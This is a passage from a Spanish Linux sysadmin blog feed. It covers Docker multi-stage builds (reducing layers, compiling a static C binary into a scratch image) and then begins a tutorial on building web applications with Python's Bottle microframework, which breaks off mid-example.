Step &lt;span class="m"&gt;7&lt;/span&gt;/8 : FROM base
 ---&amp;gt; 9a6cafb2fd49
Step &lt;span class="m"&gt;8&lt;/span&gt;/8 : CMD python script.py
 ---&amp;gt; Running in bad18c8f4f27
 ---&amp;gt; 6221630d5ac3
Removing intermediate container bad18c8f4f27
Successfully built 6221630d5ac3
Successfully tagged release:latest
gerard@aldebaran:~/docker/pipeline$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y en este caso tenemos una release, con una imagen de &lt;em&gt;runtime&lt;/em&gt;, sin los tests, y con la directiva &lt;strong&gt;CMD&lt;/strong&gt; lista para ser usada.&lt;/p&gt;
&lt;h3&gt;Reducción de capas&lt;/h3&gt;
&lt;p&gt;A todos nos ha pasado que copiamos unos ficheros en nuestras imágenes, y tras aplicarles modificaciones de permisos y de usuarios, esos ficheros ocupan el doble o más. Es inevitable. La idea es poder utilizar una imagen grande para adecuar nuestros fichero y luego copiarlos a una imagen en su forma final.&lt;/p&gt;
&lt;p&gt;Supongamos el siguiente ejemplo, donde &lt;em&gt;bigfile&lt;/em&gt; es un fichero de 100mb con permisos 644 y que pertenece a mi usuario:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/bigfiles$ cat Dockerfile 
FROM busybox AS builder
COPY bigfile /
RUN chmod &lt;span class="m"&gt;777&lt;/span&gt; /bigfile &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    chown nobody:nogroup /bigfile

FROM busybox
COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /bigfile /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ls&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;-lh&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/bigfiles$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Construimos la imagen:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/bigfiles$ docker build -t final .
Sending build context to Docker daemon  &lt;span class="m"&gt;104&lt;/span&gt;.9MB
Step &lt;span class="m"&gt;1&lt;/span&gt;/6 : FROM busybox AS builder
latest: Pulling from library/busybox
7520415ce762: Pull &lt;span class="nb"&gt;complete&lt;/span&gt; 
Digest: sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f
Status: Downloaded newer image &lt;span class="k"&gt;for&lt;/span&gt; busybox:latest
 ---&amp;gt; 00f017a8c2a6
Step &lt;span class="m"&gt;2&lt;/span&gt;/6 : COPY bigfile /
 ---&amp;gt; 0a27ff02824b
Removing intermediate container 56007f1c8e9d
Step &lt;span class="m"&gt;3&lt;/span&gt;/6 : RUN chmod &lt;span class="m"&gt;777&lt;/span&gt; /bigfile &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     chown nobody:nogroup /bigfile
 ---&amp;gt; Running in b8ff92d84014
 ---&amp;gt; bf3600cb8967
Removing intermediate container b8ff92d84014
Step &lt;span class="m"&gt;4&lt;/span&gt;/6 : FROM busybox
 ---&amp;gt; 00f017a8c2a6
Step &lt;span class="m"&gt;5&lt;/span&gt;/6 : COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /bigfile /
 ---&amp;gt; 57b8aa7c2aeb
Removing intermediate container e2ec30bfd912
Step &lt;span class="m"&gt;6&lt;/span&gt;/6 : CMD ls -lh /
 ---&amp;gt; Running in a212d95bb65f
 ---&amp;gt; c672e1ad3fcb
Removing intermediate container a212d95bb65f
Successfully built c672e1ad3fcb
Successfully tagged final:latest
gerard@aldebaran:~/docker/bigfiles$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado es sorprendente: Nos ahorramos el duplicado del fichero &lt;em&gt;bigfile&lt;/em&gt;, y este conserva los permisos que le habíamos indicado, pero &lt;strong&gt;el usuario sigue siendo root&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/bigfiles$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
final               latest              c672e1ad3fcb        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       106MB
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              bf3600cb8967        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       211MB
busybox             latest              00f017a8c2a6        &lt;span class="m"&gt;2&lt;/span&gt; months ago        &lt;span class="m"&gt;1&lt;/span&gt;.11MB
gerard@aldebaran:~/docker/bigfiles$ docker &lt;span class="nb"&gt;history&lt;/span&gt; bf3600cb8967
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
bf3600cb8967        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       &lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; /bin/sh -c chmod &lt;span class="m"&gt;777&lt;/span&gt; /bigfile &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;     ch...   105MB               
0a27ff02824b        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:777847f3f03c68...   105MB               &lt;/span&gt;
00f017a8c2a6        &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;sh&amp;quot;]                   0B                  &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:c9ecd8ff00c653f...   1.11MB              &lt;/span&gt;
gerard@aldebaran:~/docker/bigfiles$ docker &lt;span class="nb"&gt;history&lt;/span&gt; final
IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT
c672e1ad3fcb        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;ls&amp;quot; &amp;quot;-lh&amp;quot; &amp;quot;/&amp;quot;]         0B                  &lt;/span&gt;
57b8aa7c2aeb        &lt;span class="m"&gt;4&lt;/span&gt; minutes ago       /bin/sh -c &lt;span class="c1"&gt;#(nop) COPY file:5e392ba9fe1d0a...   105MB               &lt;/span&gt;
00f017a8c2a6        &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop)  CMD [&amp;quot;sh&amp;quot;]                   0B                  &lt;/span&gt;
&amp;lt;missing&amp;gt;           &lt;span class="m"&gt;2&lt;/span&gt; months ago        /bin/sh -c &lt;span class="c1"&gt;#(nop) ADD file:c9ecd8ff00c653f...   1.11MB              &lt;/span&gt;
gerard@aldebaran:~/docker/bigfiles$ docker run --rm final &lt;span class="p"&gt;|&lt;/span&gt; grep bigfile
-rwxrwxrwx    &lt;span class="m"&gt;1&lt;/span&gt; root     root      &lt;span class="m"&gt;100&lt;/span&gt;.0M May  &lt;span class="m"&gt;9&lt;/span&gt; &lt;span class="m"&gt;13&lt;/span&gt;:53 bigfile
gerard@aldebaran:~/docker/bigfiles$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto limita mucho el uso de esta solución.&lt;/p&gt;
&lt;h3&gt;Build container pattern&lt;/h3&gt;
&lt;p&gt;Construir nuestros artefactos en la misma imagen que los va a ejecutar es una guarrada. El truco era tener una imagen para construir el artefacto, y se pasaba a una imagen de &lt;em&gt;runtime&lt;/em&gt; mediante un uso inteligente de volúmenes. Con el nuevo &lt;strong&gt;COPY --from&lt;/strong&gt; no necesitamos el paso intermedio de volúmenes, y se puede hacer todo con un solo paso.&lt;/p&gt;
&lt;p&gt;Supongamos que queremos crear un programa en C, compilarlo y tener una imagen que se limite a ejecutarlo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/test$ cat hello.c 
&lt;span class="c1"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="c1"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

int main&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    printf&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Hello world!\n&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    exit&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/test$ cat Dockerfile 
FROM alpine:3.5 AS builder
RUN apk add --no-cache gcc musl-dev
COPY hello.c /
RUN gcc -static -o /hello /hello.c &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    strip /hello

FROM scratch
COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /hello /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/hello&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, la primera imagen compila nuestro código fuente, y la segunda se limita a copiar el resultado, que al tratarse de un binario estático no necesita librerías adicionales, lo que nos permite partir de la imagen vacía &lt;em&gt;scratch&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/test$ docker build -t hello .
Sending build context to Docker daemon  &lt;span class="m"&gt;3&lt;/span&gt;.072kB
...  
Step &lt;span class="m"&gt;5&lt;/span&gt;/7 : FROM scratch
 ---&amp;gt; 
Step &lt;span class="m"&gt;6&lt;/span&gt;/7 : COPY --from&lt;span class="o"&gt;=&lt;/span&gt;builder /hello /
 ---&amp;gt; b01e9f03b69d
Removing intermediate container c177f03a3dab
Step &lt;span class="m"&gt;7&lt;/span&gt;/7 : CMD /hello
 ---&amp;gt; Running in e19eb91bc975
 ---&amp;gt; fb52f56a9c03
Removing intermediate container e19eb91bc975
Successfully built fb52f56a9c03
Successfully tagged hello:latest
gerard@aldebaran:~/docker/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto podemos desechar la imagen de compilación que es muy grande, en favor a una imagen de &lt;em&gt;runtime&lt;/em&gt; sin compiladores ni librerías, sin necesidad de preocuparnos de limpiar aquello que se haya instalado para compilar nuestro binario.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/test$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
hello               latest              fb52f56a9c03        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       &lt;span class="m"&gt;10&lt;/span&gt;.1kB
&amp;lt;none&amp;gt;              &amp;lt;none&amp;gt;              fe6a6edae999        &lt;span class="m"&gt;2&lt;/span&gt; minutes ago       101MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.5                 4a415e366388        &lt;span class="m"&gt;2&lt;/span&gt; months ago        &lt;span class="m"&gt;3&lt;/span&gt;.99MB
gerard@aldebaran:~/docker/test$ docker run -ti --rm hello
Hello world!
gerard@aldebaran:~/docker/test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es especialmente interesante ver que hacen falta 101mb para construir un binario que solo necesita 10kb para ejecutarse...&lt;/p&gt;</content><category term="docker"></category><category term="dockerfile"></category><category term="multistage"></category><category term="build"></category></entry><entry><title>Desarrollando aplicaciones web con python y bottle</title><link href="http://www.linuxsysadmin.ml/2017/05/desarrollando-aplicaciones-web-con-python-y-bottle.html" rel="alternate"></link><published>2017-05-15T10:00:00+02:00</published><updated>2017-05-15T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-05-15:/2017/05/desarrollando-aplicaciones-web-con-python-y-bottle.html</id><summary type="html">&lt;p&gt;Ya sabéis que me gusta mucho el lenguaje &lt;strong&gt;python&lt;/strong&gt;. Muchos de mis ejemplos y algunas aplicaciones simples no merecen el uso de un &lt;em&gt;framework&lt;/em&gt; tan grande como pueda ser &lt;strong&gt;django&lt;/strong&gt;. Para estos casos me encantan los &lt;em&gt;microframeworks&lt;/em&gt;, y aunque hay varias alternativas disponibles, me gusta especialmente un &lt;em&gt;microframework&lt;/em&gt; llamado &lt;strong&gt;bottle …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ya sabéis que me gusta mucho el lenguaje &lt;strong&gt;python&lt;/strong&gt;. Muchos de mis ejemplos y algunas aplicaciones simples no merecen el uso de un &lt;em&gt;framework&lt;/em&gt; tan grande como pueda ser &lt;strong&gt;django&lt;/strong&gt;. Para estos casos me encantan los &lt;em&gt;microframeworks&lt;/em&gt;, y aunque hay varias alternativas disponibles, me gusta especialmente un &lt;em&gt;microframework&lt;/em&gt; llamado &lt;strong&gt;bottle&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Una de las mejores características de este &lt;em&gt;framework&lt;/em&gt; es que no es complejo. Ponerse a hacer algo cuesta un tiempo de aprendizaje tendiendo a cero, y &lt;a href="https://bottlepy.org/docs/dev/"&gt;la documentación&lt;/a&gt; es excelente. Solamente nos oculta la complejidad del protocolo &lt;strong&gt;WSGI&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Otro punto a favor es la sencillez y simplicidad. No tiene dependencias con ninguna base de datos, motor de plantillas (aunque lleva un motor de plantillas mínimo) o &lt;em&gt;middleware&lt;/em&gt; externo. No añade nada que no tenga una especificación formal, y evita protocolos propios (por ejemplo, sesiones), en favor de especificaciones aceptadas (por ejemplo, &lt;em&gt;cookies&lt;/em&gt;).&lt;/p&gt;
&lt;h2&gt;Objetos y métodos básicos&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Bottle&lt;/strong&gt;: Objeto principal del &lt;em&gt;framework&lt;/em&gt;, es una forma de aglutinar el &lt;em&gt;callable wsgi&lt;/em&gt; con un conjunto de rutas. Nuestra aplicación va a ser una instancia de este objeto.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;request&lt;/strong&gt;: Objeto nos permite acceder a los datos referentes a la petición que nos han hecho. Incluye los parámetros GET, las &lt;em&gt;cookies&lt;/em&gt; y cabeceras, entre otras cosas.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;response&lt;/strong&gt;: Objeto que nos permite modificar nuestras repuestas, añadiendo cabeceras, códigos de estado, &lt;em&gt;cookies&lt;/em&gt; y otros conceptos.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;template&lt;/strong&gt;: Método que inyecta nuestro contexto a una plantilla y nos devuelve la respuesta ya formada, lista para devolverla.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;view&lt;/strong&gt;: Lo mismo que el método &lt;strong&gt;template&lt;/strong&gt;, pero en versión decorador.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;redirect&lt;/strong&gt;: &lt;em&gt;Helper&lt;/em&gt; que nos permite devolver una redirección a otra URL en nuestro código.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;abort&lt;/strong&gt;: &lt;em&gt;Helper&lt;/em&gt; que nos permite devolver estado de error desde nuestro controlador.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Una aplicación vacía&lt;/h2&gt;
&lt;p&gt;Vamos a crear una carpeta para contener nuestro proyecto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects$ mkdir myapp
gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; myapp/
gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Siguiendo las buenas prácticas, vamos a trabajar con &lt;strong&gt;virtualenv&lt;/strong&gt;, que nos servirá para poner nuestras librerías, que de momento se limitan al &lt;em&gt;framework&lt;/em&gt;. En adelante, es posible poner librerías para acceder a una base de datos, nuevos motores de plantillas y librerías más específicas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/projects/myapp$ virtualenv .venv
New python executable in /home/gerard/projects/myapp/.venv/bin/python
Installing setuptools, pip, wheel...done.
gerard@aldebaran:~/projects/myapp$ . .venv/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ pip install bottle
Collecting bottle
Installing collected packages: bottle
Successfully installed bottle-0.12.13
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como queremos poder reproducir nuestro entorno usaremos &lt;em&gt;pip freeze&lt;/em&gt; para guardar las dependencias, en vista a poderlas instalar en un futuro entorno real.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ pip freeze &amp;gt; requirements.txt
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo mínimo para ejecutar una aplicación &lt;em&gt;WSGI compilant&lt;/em&gt; es un servidor &lt;em&gt;WSGI&lt;/em&gt; y la aplicación misma. Una aplicación construida con &lt;strong&gt;bottle&lt;/strong&gt; es básicamente una instancia del objeto &lt;em&gt;Bottle&lt;/em&gt;, a la que iremos registrando rutas. De momento la dejamos vacía, lo que nos va a responder siempre un error 404.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat app.py 
from bottle import Bottle

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En un entorno real, el servidor a usar sería otro, por ejemplo &lt;strong&gt;apache&lt;/strong&gt;, &lt;strong&gt;uwsgi&lt;/strong&gt; o &lt;strong&gt;gunicorn&lt;/strong&gt;, pero para desarrollar, podemos aprovecharnos del servidor integrado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ python -m bottle --debug --reload app:app
Bottle v0.12.13 server starting up &lt;span class="o"&gt;(&lt;/span&gt;using WSGIRefServer&lt;span class="o"&gt;())&lt;/span&gt;...
Listening on http://localhost:8080/
Hit Ctrl-C to quit.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para nuestra comodidad futura, vamos a poner el comando en un &lt;em&gt;script&lt;/em&gt;, en el que podemos definir nuestras propias variables de entorno o aquellas que queramos aplicar estando en nuestro entorno de desarrollo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat server.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nv"&gt;PYTHONDONTWRITEBYTECODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
python -m bottle --debug --reload app:app
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ chmod a+x server.sh 
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ ./server.sh 
Bottle v0.12.13 server starting up &lt;span class="o"&gt;(&lt;/span&gt;using WSGIRefServer&lt;span class="o"&gt;())&lt;/span&gt;...
Listening on http://localhost:8080/
Hit Ctrl-C to quit.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ya podemos dirigirnos a &lt;a href="http://localhost:8080/"&gt;http://localhost:8080/&lt;/a&gt; para comprobar un bonito error 404.&lt;/p&gt;
&lt;h2&gt;Registrando rutas a controladores&lt;/h2&gt;
&lt;p&gt;La idea es muy simple: se registran rutas a funciones que devuelven la respuesta resultado. Hay varias formas de añadir rutas a nuestra aplicación, pero la que más me gusta es el decorador.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat app.py 
from bottle import Bottle

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def home&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;Home page&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De esta forma, todas las peticiones GET a / van a devolver una página HTML con el contenido retornado. El código de retorno es un 200 y el &lt;em&gt;content-type&lt;/em&gt; es &lt;em&gt;text/html&lt;/em&gt; por defecto, aunque se puede cambiar con el objeto &lt;em&gt;response&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Usando plantillas y segmentos de URL&lt;/h2&gt;
&lt;p&gt;No es una buena práctica poner en el controlador la respuesta HTML. Para eso, &lt;strong&gt;bottle&lt;/strong&gt; nos ofrece un motor de plantillas propio, y la facilidad de trabajar con otros. También nos permite capturar parte de la URL como parámetros; veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat app.py 
from bottle import Bottle, view

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def home&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;Home page&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/hello/&amp;lt;name&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
@view&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;(&lt;/span&gt;name&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;nombre&amp;#39;&lt;/span&gt;: name,
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat views/hello.tpl 
&amp;lt;p&amp;gt;Hola &lt;span class="o"&gt;{{&lt;/span&gt; nombre &lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/p&amp;gt;
&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, todo lo que siga a &lt;em&gt;/hello/&lt;/em&gt; en la URL se pasará a la función controlador, como una variable local &lt;em&gt;name&lt;/em&gt;. Nuestra función devuelve un contexto, para que el decorador &lt;em&gt;view&lt;/em&gt; pueda pintar la plantilla &lt;em&gt;hello&lt;/em&gt;, que se encuentra en &lt;em&gt;views/hello.tpl&lt;/em&gt;. Las variables disponibles para la plantilla son las claves del diccionario, que van a valer lo que pongamos como valores en el mismo diccionario.&lt;/p&gt;
&lt;p&gt;En el caso de hacer una petición a &lt;em&gt;/hello/gerard&lt;/em&gt;, la variable local &lt;em&gt;name&lt;/em&gt; va a valer "gerard" y la plantilla va a disponer de una variable &lt;em&gt;nombre&lt;/em&gt; que vale también "gerard".&lt;/p&gt;
&lt;p&gt;Algunas aplicaciones no necesitan plantillas HTML. Por ejemplo una API solo necesitaría convertir una expresión &lt;em&gt;python&lt;/em&gt; en su equivalente JSON, mediante una función adecuada, que podemos ver como un motor de plantillas.&lt;/p&gt;
&lt;h2&gt;Modelos y respuestas distintas&lt;/h2&gt;
&lt;p&gt;No hay ninguna capa de acceso a datos en &lt;strong&gt;bottle&lt;/strong&gt;. Si se necesita acceder a datos, se debe usar alguna librería auxiliar; personalmente me encanta &lt;a href="http://mongoengine.org/"&gt;mongoengine&lt;/a&gt; y &lt;a href="http://docs.peewee-orm.com/en/latest/"&gt;peewee&lt;/a&gt;. Otra opción es implementar un patrón &lt;a href="https://es.wikipedia.org/wiki/Data_Access_Object"&gt;Data Access Object&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Aún así, las buenas prácticas incitan a separar el modelo de los controladores, y eso lo podéis hacer fácilmente relegando las funciones u objetos de datos en un módulo aparte.&lt;/p&gt;
&lt;p&gt;Vamos a hacer una ruta para devolver objetos en forma de API con JSON (REST, por supuesto). Así también podemos ver como indicar un &lt;em&gt;content-type&lt;/em&gt; distinto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;.venv&lt;span class="o"&gt;)&lt;/span&gt; gerard@aldebaran:~/projects/myapp$ cat app.py 
from bottle import Bottle, view, abort, response
from json import dumps
from models import get_product

&lt;span class="nv"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Bottle&lt;span class="o"&gt;()&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def home&lt;span class="o"&gt;()&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;h1&amp;gt;Home page&amp;lt;/h1&amp;gt;&amp;#39;&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/hello/&amp;lt;name&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
@view&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def hello&lt;span class="o"&gt;(&lt;/span&gt;name&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;nombre&amp;#39;&lt;/span&gt;: name,
    &lt;span class="o"&gt;}&lt;/span&gt;

@app.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/products/&amp;lt;id&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
def api_get_product&lt;span class="o"&gt;(&lt;/span&gt;id&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;product&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; get_product&lt;span class="o"&gt;(&lt;/span&gt;id&lt;span class="o"&gt;)&lt;/span&gt;
